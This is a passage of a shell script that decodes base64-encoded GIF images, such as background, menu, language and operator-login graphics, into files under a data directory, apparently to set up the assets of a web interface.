DKZoR0va0pr2tKhNrWpXy9rVsvK1sI2tbGdL29ra9ra4za1udztbUvr2t8ANrnCHS9ziGve4yD3u
I5fL3OY697nQja50p0vd6jJSjtjNrna3y93ueve74A2veN+YxvKa97zoTa9618ve9rr3vWZ8onzn
S9/62ve++M2vfvfL3/0e8b8ADrCAB0zgAhv4wAhOMIJXyOAGO/jBEI6w/4QnTOEKW7jCI8ywhjfM
4Q57+MMgDrGIOeDAEpv4xChOsYpXzOIWu/jFLjagjGdM4xrb+MY4zrGOd8zjHcfvx0AOspCHTOQi
G9nI0UuykpfM5CY7+clQjrKUp+w85Fn5yljOspa3zOUue/nLYP7y7MZM5jKb+cxoTrOa18zmNsOO
dXCOs5znTOc62/nOeM6znvfM5z77Gc+GC7SgB03oQhv60IhOtKIXPTi4OfrRkI60pCdN6UpbGtJZ
y7SmN83pTnv606AO9aZ7RupSm/rUqE61qk3G6la7+tWw9hgGZk3rWtv61rjOta53zete+/rXwA62
sIdN7GLf2gPITrayl//N7GY7+9nQjra0p03talv72th+tga2ze1ue/vb4A63uMdN7nKb+9zoTre6
183udn87A/COt7znTe962/ve+M63vvfN7377+98AD7jA6c2Aghv84AhPuMIXzvCGO/zhEI+4xCdO
8Ypb/OIYx3gCNs7xjnv84yAPuchHTvKSm/zkKE+5ylfO8pa73OXIirnMZ07zmtv85jjPuc53zvOe
+/znxAKA0IdO9KIb/ehIT7rSl870pjv96VCPutSnTvWqW/3qWMc6rbbO9a57/etgD7vYx072spv9
7GhPu9rXzva2u/3tcI+73MUuhbrb/e54z7ve9873vvv974APvOAHT/h0whv+8IhPvOIXz/jGO/7x
kI+85CdP+cpb/vKYz7zmN8/5znv+86APvehHT/rSm/70qE+96lfP+ta7/vWwj73sZ0/72tv+9rjP
ve53z/ve+/73wA++8IdP/OIb//jIT77yl8/85jv/+dCPvvSnT/3qW7/wgQAAOw==" | base64 -d >$DUMP_PATH/data/bg_body.gif


echo "R0lGODlhfgAXANUAAFFRUV9fXzk5OTw8PEdHR0hISDMzMzs7Ozg4OIODg1BQUEpKSnR0dHJyckVF
RXh4eHl5eW9vb0RERGJiYk1NTTAwMDQ0ND09PT8/P3Z2dmVlZVpaWlhYWElJSVNTUzIyMnBwcHd3
d21tbWhoaDc3N2pqamdnZ0JCQmxsbG5ubjY2NjExMT4+PmlpaXFxcUFBQS8vLzo6Omtra3Nzc2Zm
ZgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAB+ABcAAAb/QMDr
BRASjcVh8qhEOptQpnRJfU6t1Wj2qsU+U5BHIhEel8litDl9brPf67h67pbX6XC8PX8/T2YpKSYm
gYOFhIKIhomHjYyPi5GKk46SlZSQmJaZl4cQICkRNDSho6WkoqimqaetrK+rsaqzrrK1tLC4trm3
pyEPLS0uLsHDxcTCyMbJx83Mz8vRytPO0tXU0NjW2dfHKRnd3OLb5Nrm4eXo5+PrwyIyDQ0lJfHz
9fTy+Pb59/38//sC6hvoT2BBggARGkx48N6METNmyJARcWJFihIxWsx4sSPHjxtDahzpUWRJkiBR
mkx58qKLCChQMGAQc2ZNmjJx2sx5syfP/587g+oc6lNoUaJAkRpNevSmCRkoMEaNOHVG1atSs1LV
apUr1q1gu4b9KrYs2bNe00bUEKAly7cr46qc61ZuXbpw8U4ssWFUgAB+AdP4G7jwYMGEDxtOzBix
48WPFUtuDLny5MiUD0/gUKCAAgWdP4cG7Zm06NKjU6Nefbq16deqXceGzZq27NqzR1PwMGTBgt6/
X/gGTlx48OHGiyNffry5cufJozN/Tl069OnGCzggQIAFC+7ewX/vPj48efHoz6s3z768+/Tt4b9f
Pz8+ffniKZyQ4ODAAf7+AfhffwMGSKCACB6ooIEMFuhggg1C+OCCE0ZIoYQCdkCAAAKccP8Chx6C
+GGHI4ZIoogonqiiiSyW6GKKLcL44oozxkijjCJecIIKKnjHo489svCjkEEOaWSRSAKpJJFLHtlk
kkxG6aSUUE5pZZAxkDDAAAYYsGWXX3rJpZhgjhnmmWamWeaaZLaJJptvuqmmnHDOGWeYGFgQQwwr
rLBnn3/6yaeggA4a6KGGJlroooQ2iiijjzqqqKSQThppoAMMigACfW7aKacreBoqqKKWSuqpn6Y6
qqqmsorqqrC2GuurstaKwAcCwAADj7ryuqsKvQL7a7DEDmusr8gKm2yxyx6r7LPMQutstNT+WgEM
e+qaLbYxaNstt96GC+6425b7rbnioksM7rnsptvuuu7GS24QADs=" | base64 -d >$DUMP_PATH/data/bg_operator_login.gif


echo "R0lGODlhAQAwAMQAANfX19TU1N7e3tvb29jY2NLS0t/f38/Pz9zc3NbW1tPT0+Dg4NDQ0N3d3dra
2s7Ozs3NzQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAA
AAAALAAAAAABADAAAAUV4AONZGmeKPkcTKEECUA4A9IIxhICADs=" | base64 -d >$DUMP_PATH/data/div.gif


echo "R0lGODlhAgAzANUAALLg+tXr+Lri+bbh+s3p+NDq+b/k+enw9drt+OPv9vb6/N7u9+jw9cTm+ezy
9djt+OXw9r7j+bLf+sPm+bLf+cvo+dPq+bPg+cjn+ebw9bfh+bTg+bPg+uvx9dHe57He98Dd7svo
+N/u96/b9K/c9cbn+bni+dfs+Ljc8Nrh5MDl+cjd6dzt99Xf5bfh+t/v99Hq+bvc77Xb8uHv963b
9c3e6MTd7LLb87zj+a7b9bLf+LHf+bHe+AAAAAAAAAAAACH5BAAAAAAALAAAAAACADMAAAZcQIXC
4eikDgcGI9OCQBKJmUf0WixYNQTi8TitAgGLBWYrFAiEEKhSwWBKsUZjMlGhDIZIBCfD4QQCJjca
LgMDGyMXFxISHDkAABQUOzk7ljs8NDw8Op0knZsfOUEAOw==" | base64 -d >$DUMP_PATH/data/hover_menu.gif


echo "R0lGODlhfwAVANUAAEJCQnd3d0RERDo6Ompqam5ubmxsbG9vb3Z2dnR0dD09PUdHR0ZGRkxMTDg4
OFBQUHNzc0lJSXJycoWFhVZWVnp6ejc3N2hoaGNjY01NTW1tbU5OTnFxcU9PT3V1dXBwcEBAQD8/
P0VFRf///7Ozs3x8fC4uLkhISDQ0NGlpaYyMjFVVVVtbW0tLS4SEhF9fX35+fpGRkWJiYkFBQXh4
eDs7O2FhYTw8PIiIiIKCgmtra2ZmZldXV1JSUlxcXIqKiiH5BAAAAAAALAAAAAB/ABUAQAb/QExl
MqkMi0cjUYlcJp/OaHPKrEKpV6tUOykhttkwZ3cIBA7lcxptZqvb6zh8/q6773J7Hk/nB1QnfQcj
hIUjJIIHMwoLCwqMjpCPjZORlJKYl5qWnJWemZ2gn5ujCy8mpKKqDR8GCQkGrrCysa+1s7a0urm8
uL63wLu/wsG9xQkuG8bEzCUdDA8PDNDS1NPR19XY1tzb3trg2eLd4eTj3+cPHCbo5u4sAxYAABby
9Pb18/n3+vj+/QD5CdxH8N9AgwUDJgRwA4VChBAXwJBAgIAEihYxXqy4MSNHjSA/ivRIsqPJkCVR
nhy5kgAMGSxVygzgAUGBAghs4tSZ82bP/50+eQoNShSo0Z9Ihx5VmrRo0wIxNjhlSlVHCgMYMMTK
ulUrVq9cv3YdK7Zs2LNg05JFu1atWbdZfzBg+7UQibaxfPRoMK8BXwB++/4NDHiwYcGICycmzPiw
4seNFzuODECCQ8iTM0dYIGDAAAGdP4cG7Zm06NKjU6Nefbq16deqXceGzZr2gBU1as/erSDBhQ8c
LvwOPlw4cOPEjxdfrrx58ufIozOHPl26c+scDti4Xr17jhIQKkIIT2C8ePLmy6Nff769evfp47N/
T18+/Pn2Cbhgcb9/fQgJFKBBTRoMiECBBBqI4IEKNpjggwxCuOCEDkZoIYUSVoghAji0kP/hhxdq
QAMEeghiYoko+qHiHiyeuCIcUb2YYhopyFCAGTfheGMAOfK4Y49A/iikjkT6WGSQRw5p5JJIMrkj
IEkGYMghSt5EwAsUZJABBVlu2SWXWoLpZZhflknmmWOmKeaaZqrZJptowplBCQ7E+eUhbpJJQQsC
bNABaH4C+mefgwZKqKCIHqqooYwW6miijUL66KKT+lmACZFSKiloPHQQAQghRPBpqKOKCqqppJ5a
6qqqtprqq6jGyiqss8rqqq0hGIDCrbX2yoACn4lQmrDBDmtsscgKQKyyxzKb7LLQNhvts9JWG+wK
Jjir7bTbenaCAAA44MA84pI7brjnloserrnsruuuuvCmK2+78dI777v3ituAAvXia+88AwQBADs=" | base64 -d >$DUMP_PATH/data/language.gif


echo "R0lGODlhkQB5APcAAAAAAP////Tz9PDv8O7t7uTj5Pn5+vf3+PX19vPz9PHx8u/v8O3t7uvr7Pf4
+PX29tnt2eny6d7m3uzy7ODm4O/07+vw6+nu6e7y7ujs6OXp5eHk4ebo5uLk4t7g3vf49/P08+/w
7+3u7eTl5OHi4eDh4N/g39vu2tzu28/pzd3u3N/v3t7t3d3s3ODu39/t3uHu4ODt3+Lv4eHt4N7q
3eTw49Pq0dbr1Nvu2drt2Njq1uDr3+Pu4uLt4ePt4uHr4Ony6Obv5eXu5OTt49HqztTs0dXs0tft
1N/w3dzt2tvs2d7u3Nrq2Ofv5uLq4eHp4NXq0tnt1tzq2uvy6unw6Obt5eXs5OPq4urw6eft5uXr
5OTq4+Lo4erv6ejt5+Po4uLn4evv6ufr5ubq5e3w7OPm4vHz8Ovt6ubo5eLk4ert6Ojr5u3x6uXu
3eDt0uTv2Obt3+Lp2+vy5Ozv6e/x7eXn4/j59/b39fT18/Lz8fDx7+7v7err6enq6Obn5eXm5OLj
4Xi8J3m9KXq9K3u9LHy+LXy+Ln6/MYC/NIDANYHANoPBOYTBO4XCPYjDQonEQ4rERYvER43FSo/G
TZDHTpHHUJLIUpPIVJTJVpbJWZfKW5jLXJfJXJrLX5vMYZzMY5zMZKHOa6LPbqTQcaXQc6jSd6rS
eqzTfavSfa3Uf6/Ug7PWibTXi7bYjbralLbWkbrZl7/bn8PdpMrhr83itdPlvtPkv9XmwtTjwtjn
xtfmxdPiwtnoyNzry93rzdvozN7q0NzoztfiyuDr0+Ls1tzl0uTt2ubu3eXt3Ofu3/D16urv5Hq9
KYLAN4fCP57NZaDNabHVhbjYkb7bm8Hdn8beqcjfrNDjudHju9bkxNroydrmy+Ds0ePs2OHq1uDn
1+zw5+js4+Tq3Onv4ebs3fDz6/P08fz8+/7+/vz8/Pv7+/j4+Pf39/b29vX19fT09PPz8/Ly8vHx
8fDw8O/v7+3t7ezs7Orq6unp6efn5+Li4t/f393d3dzc3Nra2v///yH5BAEAAP8ALAAAAACRAHkA
AAj/ANEJHEiwoMGDCBMqXMiwocOHEBOmEzgRXcWLFDNa1BhRI8aNID+K9EgyZMmOJlOOTImypcuX
MGPKnEmzpk2ZBtKly7lTJ08D6nYGBSpUKDqgRw0kXWpAqTqnUNM9lZpzas+rP31qxepzqNeiSMMq
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
